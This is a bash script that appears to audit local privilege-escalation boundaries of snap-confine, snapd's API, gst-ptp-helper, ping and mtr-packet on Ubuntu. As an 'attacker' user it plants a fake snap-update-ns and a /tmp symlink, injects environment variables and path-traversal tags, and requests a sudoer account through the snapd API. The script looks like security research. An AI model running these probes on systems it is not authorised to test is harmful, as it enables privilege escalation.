#!/usr/bin/env bash
set -u

export LC_ALL=C

ATTACKER="${ATTACKER:-attacker}"
WORK="${WORK:-/tmp/capability-helpers-probe}"
GST_HELPER="/usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper"

section() {
  printf '\n===== %s =====\n' "$*"
}

run() {
  printf '+ %s\n' "$*"
  bash -lc "$*" 2>&1
  local rc=$?
  printf 'rc=%s\n' "$rc"
}

as_attacker() {
  printf '+ runuser -u %s -- %s\n' "$ATTACKER" "$*"
  runuser -u "$ATTACKER" -- bash -lc "$*" 2>&1
  local rc=$?
  printf 'rc=%s\n' "$rc"
}

cleanup() {
  rm -rf "$WORK"
  rm -rf /tmp/snap.rootfs_ATTACK 2>/dev/null || true
  if [ -L /tmp/snap-private-tmp ]; then
    rm -f /tmp/snap-private-tmp 2>/dev/null || true
  fi
  rm -f /run/snapd/lock/fakesnap.lock /run/snapd/lock/fakesnap2.lock /run/snapd/lock/foo.lock 2>/dev/null || true
}

trap cleanup EXIT
cleanup
mkdir -p "$WORK"
chmod 1777 "$WORK"

section "target package and default install proof"
run 'id; getent passwd attacker; cat /etc/os-release | sed -n "1,8p"; uname -a'
run 'dpkg-query -W -f='\''${binary:Package}\t${Version}\t${Architecture}\n'\'' ubuntu-minimal ubuntu-standard ubuntu-server snapd libgstreamer1.0-0 iputils-ping mtr-tiny 2>&1'
run 'dpkg -V snapd libgstreamer1.0-0 iputils-ping mtr-tiny; echo dpkg_verify_rc=$?'
run 'dpkg -S /usr/lib/snapd/snap-confine /usr/bin/ping /usr/bin/mtr-packet /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper'
run 'stat -c "%n %F %A %a %U:%G %u:%g %s" /usr/lib/snapd/snap-confine /usr/bin/ping /usr/bin/mtr-packet /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper'
run 'getcap -v /usr/lib/snapd/snap-confine /usr/bin/ping /usr/bin/mtr-packet /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper'
run 'snap version 2>&1; snap list --all 2>&1 || true'

section "attacker baseline and namespace controls"
as_attacker 'id; grep -E "^(Uid|Gid|Groups|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs|Seccomp):" /proc/self/status'
as_attacker 'ip link set lo down 2>&1; echo ip_link_set_lo_rc=$?'
as_attacker 'unshare -Ur true 2>&1; echo unshare_user_rc=$?; unshare -Urn sh -c "id; grep -E \"^(Cap(Inh|Prm|Eff|Bnd|Amb))\" /proc/self/status" 2>&1; echo unshare_user_net_rc=$?'
run 'aa-status 2>&1 || true; test -e /etc/apparmor.d/usr.lib.snapd.snap-confine.real && sed -n "1,220p" /etc/apparmor.d/usr.lib.snapd.snap-confine.real | grep -E "capability|cgroup|change_profile|SNAP_MOUNT_DIR|/var/lib|/tmp/snap.rootfs" || true'
run 'findmnt -R /sys/fs/cgroup /sys/fs/bpf /snap /var/lib/snapd 2>&1 || true; ls -ld /sys/fs/cgroup /sys/fs/bpf /snap /var/lib/snapd /var/lib/snapd/snaps /var/snap /run/snapd /run/snapd/lock /run/snapd/ns 2>&1'

section "snapd sockets, API authorization, and writable state"
run 'systemctl is-active snapd.socket snapd.service snapd.seeded.service 2>&1 || true; ls -l /run/snapd.socket /run/snapd-snap.socket 2>&1; ss -xlpn 2>/dev/null | grep -E "/run/snapd(-snap)?\\.socket" || true'
as_attacker 'curl -i --max-time 5 --unix-socket /run/snapd.socket http://localhost/v2/system-info 2>&1 | sed -n "1,18p"'
as_attacker 'curl -i --max-time 5 --unix-socket /run/snapd.socket http://localhost/v2/snaps 2>&1 | sed -n "1,24p"'
as_attacker 'curl -i --max-time 5 --unix-socket /run/snapd.socket -H "Content-Type: application/json" -X POST --data "{\"action\":\"install\",\"snaps\":[\"hello-world\"]}" http://localhost/v2/snaps 2>&1 | sed -n "1,24p"'
as_attacker 'curl -i --max-time 5 --unix-socket /run/snapd.socket -H "Content-Type: application/json" -X POST --data "{\"email\":\"root@example.invalid\",\"sudoer\":true}" http://localhost/v2/create-user 2>&1 | sed -n "1,24p"'
as_attacker 'curl -i --max-time 5 --unix-socket /run/snapd-snap.socket http://localhost/v2/system-info 2>&1 | sed -n "1,24p"'
as_attacker 'for d in /snap /var/lib/snapd /var/lib/snapd/snaps /var/lib/snapd/seed /var/snap /run/snapd /run/snapd/lock /run/snapd/ns /sys/fs/cgroup /sys/fs/bpf; do if [ -e "$d" ]; then stat -c "%A %U:%G %n" "$d"; test -w "$d"; echo "test_writable_rc:$d:$?"; touch "$d/capability_helpers_uid1001" 2>&1; echo "touch_rc:$d:$?"; rm -f "$d/capability_helpers_uid1001" 2>/dev/null || true; else echo "missing:$d"; fi; done'

section "snap-confine direct file-capability boundary"
as_attacker "mkdir -p '$WORK/bin' '$WORK/common' '$WORK/data' '$WORK/fake-mount/fakesnap/current' '$WORK/private-target' && cat > '$WORK/payload.sh' <<'EOF'
#!/bin/sh
{
  echo PAYLOAD_RAN
  id
  grep -E '^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb))' /proc/self/status
  /bin/sh -p -c 'id' 2>&1
} > '$WORK/payload.out'
EOF
chmod +x '$WORK/payload.sh'
cat > '$WORK/bin/snap-update-ns' <<'EOF'
#!/bin/sh
echo FAKE_UPDATE_NS_RAN > '$WORK/fake-update-ns.out'
exit 0
EOF
chmod +x '$WORK/bin/snap-update-ns'
ln -s '$WORK/private-target' /tmp/snap-private-tmp 2>/dev/null || true
mkdir -p /tmp/snap.rootfs_ATTACK 2>/dev/null || true"
as_attacker "env -i PATH='$WORK/bin:/usr/bin:/bin' HOME=/home/$ATTACKER USER=$ATTACKER SNAPD_DEBUG=1 SNAP_NAME=fakesnap SNAP_INSTANCE_NAME=fakesnap SNAP_REVISION=1 SNAP_COOKIE=cookie SNAP_CONTEXT=ctx SNAP_USER_COMMON='$WORK/common' SNAP_USER_DATA='$WORK/data' SNAP_MOUNT_DIR='$WORK/fake-mount' LD_PRELOAD='$WORK/nope.so' /usr/lib/snapd/snap-confine snap.fakesnap.app '$WORK/payload.sh' 2>&1; echo snap_confine_rc=\$?; for f in '$WORK/payload.out' '$WORK/fake-update-ns.out'; do echo marker:\$f; test -e \$f && cat \$f || echo MISSING; done"
as_attacker 'for tag in "snap..app" "snap.fakesnap/../../tmp.x" "snap.foo..bar.app"; do echo tag=$tag; env -i PATH=/usr/bin:/bin SNAP_NAME=fakesnap SNAP_INSTANCE_NAME=fakesnap SNAP_REVISION=1 SNAP_COOKIE=cookie /usr/lib/snapd/snap-confine "$tag" /bin/id 2>&1; echo rc=$?; done'
as_attacker "unshare -Urnm bash -lc 'id; grep -E \"^(Cap(Inh|Prm|Eff|Bnd|Amb))\" /proc/self/status; mkdir -p $WORK/userns-snap/core/1; mount --bind $WORK/userns-snap /snap 2>&1; echo bind_snap_rc=\$?; env -i PATH=/usr/bin:/bin SNAPD_DEBUG=1 SNAP_NAME=fakesnap2 SNAP_INSTANCE_NAME=fakesnap2 SNAP_REVISION=1 SNAP_COOKIE=cookie /usr/lib/snapd/snap-confine snap.fakesnap2.app /bin/id 2>&1; echo sc_userns_rc=\$?; echo userns-root-created > $WORK/userns-created; stat -c \"%n %u:%g %U:%G\" $WORK/userns-created' 2>&1"
run 'ls -l /run/snapd/lock 2>&1 || true; find /tmp -maxdepth 1 \( -name "snap.rootfs_*" -o -name "snap-private-tmp" \) -printf "%M %u:%g %p -> %l\n" 2>/dev/null || true'

section "gst-ptp-helper protocol and capability drop"
as_attacker 'python3 - <<'"'"'PY'"'"'
import os, select, struct, subprocess, time
helper = "/usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper"
cmd = [helper, "-i", "eth0", "--clock-id", "0x0102030405060708"]
p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
clock = p.stdout.read(11)
print("pid", p.pid)
print("clock_frame_len", len(clock), "hex", clock.hex())
time.sleep(0.2)
with open(f"/proc/{p.pid}/status", "r", encoding="utf-8") as f:
    for line in f:
        if line.startswith(("Uid:", "Gid:", "CapInh:", "CapPrm:", "CapEff:", "CapBnd:", "CapAmb:", "NoNewPrivs:")):
            print(line.strip())
subprocess.run(["getpcaps", str(p.pid)], check=False)
ptp = bytearray(44)
ptp[0] = 0x01
ptp[1] = 0x02
ptp[2:4] = (44).to_bytes(2, "big")
ptp[20:28] = bytes.fromhex("0102030405060708")
ptp[28:30] = (1).to_bytes(2, "big")
ptp[30:32] = (0x1234).to_bytes(2, "big")
ptp[32] = 1
body = bytes([0]) + (0).to_bytes(8, "big") + ptp
frame = struct.pack(">HB", len(body), 0) + body
p.stdin.write(frame)
p.stdin.flush()
ready, _, _ = select.select([p.stdout], [], [], 2)
ack = os.read(p.stdout.fileno(), 64) if ready else b""
print("ack_len", len(ack), "ack_hex", ack.hex())
p.stdin.close()
try:
    p.wait(timeout=2)
except subprocess.TimeoutExpired:
    p.kill()
    p.wait()
err = p.stderr.read().decode("utf-8", "replace").replace("\0", "?")
print("rc", p.returncode)
print("stderr_tail", err[-300:].replace("\n", "\\n"))
PY'
as_attacker 'python3 - <<'"'"'PY'"'"'
import struct, subprocess
helper = "/usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper"
p = subprocess.Popen([helper, "-i", "eth0", "--clock-id", "0x0102030405060708"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
print("clock", p.stdout.read(11).hex())
ptp = bytearray(44)
ptp[0] = 0x01
ptp[1] = 0x02
ptp[2:4] = (44).to_bytes(2, "big")
ptp[20:28] = bytes.fromhex("9999999999999999")
ptp[28:30] = (1).to_bytes(2, "big")
ptp[30:32] = (0x2222).to_bytes(2, "big")
ptp[32] = 1
body = bytes([0]) + (0).to_bytes(8, "big") + ptp
out, err = p.communicate(input=struct.pack(">HB", len(body), 0) + body, timeout=3)
print("rc", p.returncode)
print("extra_stdout", out.hex())
print("stderr", err.decode("utf-8", "replace").replace("\0", "?")[-300:].replace("\n", "\\n"))
PY'
as_attacker 'LD_PRELOAD=/tmp/no-such-gst-preload.so /usr/lib/aarch64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper -i eth0 --clock-id 0x0102030405060708 </dev/null >/tmp/gst-preload.out 2>/tmp/gst-preload.err; echo gst_preload_rc=$?; xxd -p /tmp/gst-preload.out 2>/dev/null || od -An -tx1 /tmp/gst-preload.out; tail -c 300 /tmp/gst-preload.err | tr "\000" "?"; rm -f /tmp/gst-preload.out /tmp/gst-preload.err'

section "ping and mtr cap_net_raw boundaries"
as_attacker 'ping -V 2>&1; ping -c1 -W1 127.0.0.1 2>&1 | sed -n "1,20p"; echo ping_rc=${PIPESTATUS:-$?}'
as_attacker 'ping -m 123 -c1 -W1 127.0.0.1 2>&1 | sed -n "1,30p"; echo ping_mark_rc=${PIPESTATUS:-$?}'
as_attacker 'ping -i 1 -c 3 127.0.0.1 >/tmp/ping-long.out 2>/tmp/ping-long.err & pid=$!; sleep 0.2; echo ping_pid=$pid; grep -E "^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs):" /proc/$pid/status 2>&1 || true; getpcaps $pid 2>&1 || true; wait $pid; echo ping_wait_rc=$?; cat /tmp/ping-long.err; rm -f /tmp/ping-long.out /tmp/ping-long.err'
as_attacker 'timeout 3 /usr/bin/mtr-packet 2>&1 <<EOF
1 check-support feature send-probe
2 check-support feature mark
3 send-probe ip-4 127.0.0.1 protocol icmp size 64 bit-pattern 0 timeout 1
4 send-probe ip-4 127.0.0.1 protocol icmp mark 123 size 64 bit-pattern 0 timeout 1
5 ../../etc/shadow path /tmp/x
EOF
echo mtr_packet_rc=$?'
as_attacker 'mkfifo /tmp/mtr-hold.in; /usr/bin/mtr-packet </tmp/mtr-hold.in >/tmp/mtr-hold.out 2>/tmp/mtr-hold.err & pid=$!; exec 9>/tmp/mtr-hold.in; sleep 0.2; echo mtr_pid=$pid; grep -E "^(Uid|Gid|Cap(Inh|Prm|Eff|Bnd|Amb)|NoNewPrivs):" /proc/$pid/status 2>&1 || true; getpcaps $pid 2>&1 || true; printf "9 bogus\n" >&9; sleep 0.2; exec 9>&-; wait $pid; echo mtr_wait_rc=$?; cat /tmp/mtr-hold.out /tmp/mtr-hold.err 2>/dev/null; rm -f /tmp/mtr-hold.in /tmp/mtr-hold.out /tmp/mtr-hold.err'

section "cleanup verification"
cleanup
run 'test ! -e /tmp/capability-helpers-probe; echo workdir_removed_rc=$?; ls -l /run/snapd/lock 2>&1 || true; find /tmp -maxdepth 1 \( -name "snap.rootfs_ATTACK" -o -name "snap-private-tmp" \) -printf "%M %u:%g %p -> %l\n" 2>/dev/null || true'
